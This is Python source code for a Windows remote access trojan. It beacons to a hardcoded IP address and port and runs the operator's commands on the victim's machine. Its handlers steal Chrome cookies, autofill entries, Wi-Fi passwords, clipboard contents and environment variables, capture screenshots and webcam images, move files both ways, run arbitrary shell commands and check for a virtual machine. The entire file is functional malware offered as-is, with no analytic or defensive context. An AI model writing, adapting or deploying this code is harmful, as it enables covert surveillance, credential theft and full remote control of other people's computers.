import socket
import subprocess
import json
import os
import platform
import time
import io
import base64
import getpass
import ctypes
import shutil
import sqlite3
import requests
import pyautogui
import psutil
import re
import win32crypt

from browser_history import get_history

HOST = "149.50.218.194"
PORT = 28727

# Utility functions
def reliable_send(s, data):
    json_data = json.dumps(data).encode()
    length = len(json_data)
    s.sendall(f"{length:<16}".encode())
    s.sendall(json_data)

def reliable_recv(s):
    length_header = s.recv(16)
    if not length_header:
        return None
    total_length = int(length_header.decode().strip())
    data = b""
    while len(data) < total_length:
        chunk = s.recv(total_length - len(data))
        if not chunk:
            break
        data += chunk
    return json.loads(data.decode())

# Info functions
def get_windows_av():
    try:
        cmd = 'powershell "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName"'
        result = subprocess.check_output(cmd, shell=True)
        return result.decode(errors="ignore").strip() or "None"
    except:
        return "Unknown"

def gather_info():
    username = getpass.getuser()
    hostname = platform.node()
    os_info = f"{platform.system()} {platform.release()}"
    av = get_windows_av()
    return {"username": username, "hostname": hostname, "os": os_info, "av": av}

# Command handlers
def handle_command(cmd):
    try:
        if cmd == "exit":
            return "exit"
        elif cmd == "chrome_passwords":
            return extract_chrome_passwords()
        elif cmd == "discord_token":
            return grab_discord_token()
        elif cmd == "windows_creds":
            return dump_windows_vault()
        elif cmd.startswith("cd "):
            path = cmd[3:]
            os.chdir(path)
            return f"[+] Changed directory to {os.getcwd()}"
        elif cmd == "pwd":
            return os.getcwd()
        elif cmd == "list":
            return "\n".join(os.listdir())
        elif cmd.startswith("exec "):
            return subprocess.getoutput(cmd[5:])
        elif cmd.startswith("upload "):
            filename = cmd.split()[1]
            data = reliable_recv(conn)
            with open(filename, "wb") as f:
                f.write(base64.b64decode(data["data"]))
            return f"[+] Uploaded {filename}"
        elif cmd.startswith("download "):
            filepath = cmd.split()[1]
            with open(filepath, "rb") as f:
                encoded = base64.b64encode(f.read()).decode()
            return {"data": encoded}
        elif cmd == "screenshot":
            screenshot = pyautogui.screenshot()
            buffer = io.BytesIO()
            screenshot.save(buffer, format="PNG")
            return {"data": base64.b64encode(buffer.getvalue()).decode()}
        elif cmd == "webcam_snap":
            import cv2
            cam = cv2.VideoCapture(0)
            time.sleep(1)
            ret, frame = cam.read()
            cam.release()
            if not ret:
                return {"error": "Webcam not available"}
            _, buffer = cv2.imencode('.jpg', frame)
            return {"data": base64.b64encode(buffer.tobytes()).decode()}
        elif cmd == "browser_history":
            outputs = get_history()
            history = outputs.histories
            return "\n".join([f"{entry[0]} - {entry[1]}" for entry in history]) or "[!] No browser history found."
        elif cmd == "wifi_passwords":
            result = subprocess.check_output("netsh wlan show profiles", shell=True).decode()
            profiles = [line.split(":")[1].strip() for line in result.splitlines() if "All User Profile" in line]
            dump = ""
            for profile in profiles:
                try:
                    detail = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True).decode()
                    password = next((line.split(":")[1].strip() for line in detail.splitlines() if "Key Content" in line), "None")
                    dump += f"SSID: {profile} | Password: {password}\n"
                except:
                    dump += f"SSID: {profile} | Error\n"
            return dump
        elif cmd == "browser_autofill":
            path = os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data", "Default", "Web Data")
            temp = "temp_autofill.db"
            shutil.copy2(path, temp)
            conn = sqlite3.connect(temp)
            cursor = conn.cursor()
            cursor.execute("SELECT name, value FROM autofill")
            rows = cursor.fetchall()
            conn.close()
            os.remove(temp)
            return "\n".join([f"{name}: {value}" for name, value in rows]) or "[!] No autofill data found."
        elif cmd == "browser_cookies":
            path = os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data", "Default", "Cookies")
            temp = "temp_cookies.db"
            shutil.copy2(path, temp)
            conn = sqlite3.connect(temp)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            cookies = ""
            for host, name, enc in cursor.fetchall():
                try:
                    decrypted = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode(errors="ignore")
                except:
                    decrypted = "[Encrypted]"
                cookies += f"{host} - {name}: {decrypted}\n"
            conn.close()
            os.remove(temp)
            return cookies
        elif cmd == "clipboard_dump":
            ctypes.windll.user32.OpenClipboard(0)
            handle = ctypes.windll.user32.GetClipboardData(13)
            pcontents = ctypes.wstring_at(handle)
            ctypes.windll.user32.CloseClipboard()
            return pcontents
        elif cmd == "system_info":
            return f"Platform: {platform.system()} {platform.release()}\nProcessor: {platform.processor()}\nArch: {platform.architecture()[0]}\nUser: {getpass.getuser()}"
        elif cmd == "installed_programs":
            return subprocess.getoutput("powershell -Command \"Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName\"")
        elif cmd == "usb_history":
            return subprocess.getoutput("powershell Get-PnpDevice -Class USB")
        elif cmd == "timezone_info":
            return subprocess.getoutput("systeminfo | findstr /C:\"Time Zone\"")
        elif cmd == "environment_vars":
            return json.dumps(dict(os.environ))
        elif cmd == "public_ip":
            return requests.get("https://api.ipify.org").text
        elif cmd == "list_users":
            return subprocess.getoutput("net user")
        elif cmd == "recent_files":
            recent_path = os.path.expanduser("~\\Recent")
            return "\n".join(os.listdir(recent_path))
        elif cmd == "screen_resolution":
            w, h = pyautogui.size()
            return f"{w}x{h}"
        elif cmd == "active_window":
            try:
                import pygetwindow as gw
                win = gw.getActiveWindow()
                return win.title if win else "[!] No active window"
            except:
                return "[!] pygetwindow not available"
        elif cmd == "keyboard_layout":
            layout = ctypes.windll.user32.GetKeyboardLayout(0)
            return str(layout)
        elif cmd == "vm_check":
            return subprocess.getoutput("powershell -Command \"Get-WmiObject Win32_ComputerSystem | Select-Object Manufacturer, Model\"")
        else:
            return subprocess.getoutput(cmd)
    except Exception as e:
        return f"[!] Error: {str(e)}"

# Main connection loop
while True:
    try:
        conn = socket.socket()
        conn.connect((HOST, PORT))
        reliable_send(conn, gather_info())
        while True:
            command = reliable_recv(conn)
            if not command:
                break
            result = handle_command(command)
            if result == "exit":
                conn.close()
                break
            reliable_send(conn, result)
        time.sleep(5)
    except:
        time.sleep(5)
